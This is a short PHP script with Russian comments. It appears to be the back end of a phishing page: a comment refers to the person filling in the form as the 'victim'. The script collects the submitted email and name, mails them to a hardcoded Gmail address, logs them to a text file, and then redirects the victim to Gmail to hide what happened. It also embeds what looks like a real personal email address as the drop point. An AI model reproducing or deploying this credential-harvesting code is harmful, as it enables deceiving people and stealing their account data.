<? 
// ----------------------------конфигурация-------------------------- // 
 
$adminemail="nikitinsergei1673@gmail.com";  // e-mail  
 
 
$date=date("d.m.y"); // число.месяц.год 
 
$time=date("H:i"); // часы:минуты:секунды 
 
$backurl="https://mail.google.com/";  // На какую страничку переходит жертва после отправки письма (это написал всё я, Коля)
 
//---------------------------------------------------------------------- // 
 
  
 
// Принимаем данные с формы 
  
$email=$_POST['email']; 

$name=$_POST['name']; 
  
 
// Проверяем валидность e-mail 
 
if (!preg_match("|^([a-z0-9_\.\-]{1,20})@([a-z0-9\.\-]{1,20})\.([a-z]{2,4})|is", 
strtolower($email))) 
 
 { 
 
  echo 
"<center>Вернитесь <a 
href='javascript:history.back(1)'><B>назад</B></a>. Вы 
указали неверные данные!"; 
 
  } 
 
 else 
 
 { 
 
 
$msg=" 
 
 
<p>Имя: $name</p> 
 
 
<p>E-mail: $email</p> 
 
 
 
"; 
 
  
 
 // Отправляем письмо админу  
 
mail("$adminemail", "$date $time Сообщение 
от $name", "$email"); 
 
  
 
// Сохраняем в базу данных 
 
$f = fopen("message.txt", "a+"); 
 
fwrite($f," \n $date $time Сообщение от $email"); 
 
fwrite($f,"\n $name "); 
 
fwrite($f,"\n ---------------"); 
 
fclose($f); 
 
  
 
// Выводим сообщение пользователю 
 
print "<script language='Javascript'><!-- 
function reload() {location = \"$backurl\"}; setTimeout('reload()', 6000); 
//--></script> 
 
$msg 
 
<p>Потверждено! Подождите, сейчас вы будете перенаправлены на главную страницу...</p>";  
exit; 
 
 } 
 
?>